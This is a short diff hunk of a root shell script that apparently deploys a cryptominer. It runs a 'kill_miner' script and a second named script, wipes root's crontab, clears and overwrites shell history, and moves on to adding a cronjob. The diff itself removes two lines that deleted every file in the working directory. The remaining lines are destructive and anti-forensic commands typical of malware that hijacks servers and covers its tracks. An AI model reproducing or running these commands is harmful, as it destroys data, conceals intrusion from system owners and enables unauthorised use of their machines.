@@ -63,8 +63,6 @@ chmod +x /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
 ./danielluis1921.sh
-rm -fv *
-rm -fR *
 cat /dev/null > /var/spool/cron/crontabs/root
 history -c && history -w
 #Add Cronjob
